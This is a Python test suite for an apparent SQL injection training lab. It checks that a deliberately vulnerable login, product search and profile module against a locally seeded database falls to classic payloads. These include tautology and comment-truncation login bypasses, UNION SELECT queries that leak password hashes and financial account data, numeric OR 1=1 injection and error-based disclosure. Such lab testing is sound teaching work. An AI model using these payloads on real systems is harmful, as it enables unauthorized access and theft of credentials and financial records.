#!/usr/bin/env python3
"""
Automated Proof-of-Exploitation Test Suite (Vulnerable Target Baseline).
Verifies that the vulnerable implementation is indeed susceptible to SQL injection vectors.
"""

import unittest
import os
import sys

# Ensure module directories are in path
TEST_DIR = os.path.dirname(os.path.abspath(__file__))
MODULE_DIR = os.path.dirname(TEST_DIR)
PROJECT_ROOT = os.path.dirname(MODULE_DIR)

if MODULE_DIR not in sys.path:
    sys.path.insert(0, MODULE_DIR)

from vulnerable.vuln_queries import (
    vulnerable_login,
    vulnerable_product_search,
    vulnerable_user_profile
)
from lab.setup_db import initialize_database

class TestVulnerableSQLi(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        """Reset and seed the database prior to tests."""
        initialize_database()

    def test_01_auth_bypass_classic_tautology(self):
        """Test authentication bypass with 'admin' OR '1'='1' --"""
        payload = "admin' OR '1'='1' --"
        res = vulnerable_login(payload, "any_dummy_password")
        self.assertEqual(res["status"], "success")
        self.assertTrue(res["authenticated"])
        self.assertIsNotNone(res["user"])
        self.assertEqual(res["user"]["username"], "admin")
        print(f"\n[+] Vulnerability Confirmed: Auth Bypass successful with payload: {payload}")

    def test_02_auth_bypass_comment_truncation(self):
        """Test authentication bypass by commenting out password clause: admin' --"""
        payload = "admin' --"
        res = vulnerable_login(payload, "invalid_pw")
        self.assertEqual(res["status"], "success")
        self.assertTrue(res["authenticated"])
        self.assertEqual(res["user"]["username"], "admin")
        print(f"[+] Vulnerability Confirmed: Password clause commented out with payload: {payload}")

    def test_03_union_based_credential_extraction(self):
        """Test UNION-based SQLi extracting users table records via search."""
        payload = "' UNION SELECT 99, username || ':' || password_hash, role, 0.00, 1, email, 0 FROM users --"
        res = vulnerable_product_search(payload)
        self.assertEqual(res["status"], "success")
        self.assertGreater(res["results_count"], 1)
        # Check if extracted credentials appear in result data
        found_admin = any("admin:" in item.get("name", "") for item in res["data"])
        self.assertTrue(found_admin, "Admin credential hash should be leaked via UNION SELECT")
        print(f"[+] Vulnerability Confirmed: UNION data leakage successful with payload: {payload}")

    def test_04_union_based_account_data_theft(self):
        """Test UNION-based SQLi extracting confidential financial accounts."""
        payload = "' UNION SELECT 99, account_number, account_type, balance, 1, ssn_last4, 0 FROM accounts --"
        res = vulnerable_product_search(payload)
        self.assertEqual(res["status"], "success")
        found_account = any("ACC-" in item.get("name", "") for item in res["data"])
        self.assertTrue(found_account, "Financial account numbers leaked via UNION SQLi")
        print(f"[+] Vulnerability Confirmed: Financial records leaked via payload: {payload}")

    def test_05_numeric_sql_injection(self):
        """Test numeric SQL injection returning all user profiles: 1 OR 1=1"""
        payload = "1 OR 1=1"
        res = vulnerable_user_profile(payload)
        self.assertEqual(res["status"], "success")
        self.assertGreaterEqual(res["results_count"], 4)
        print(f"[+] Vulnerability Confirmed: Numeric SQLi bypassed filter with payload: {payload}")

    def test_06_error_based_sql_disclosure(self):
        """Test error-based SQLi causing raw database syntax disclosure."""
        payload = "1' INVALID SYNTAX --"
        res = vulnerable_user_profile(payload)
        self.assertEqual(res["status"], "error")
        self.assertIn("error", res)
        self.assertTrue(len(res["error"]) > 0)
        print(f"[+] Vulnerability Confirmed: Raw DB error disclosed on payload: {payload}")

if __name__ == "__main__":
    unittest.main()
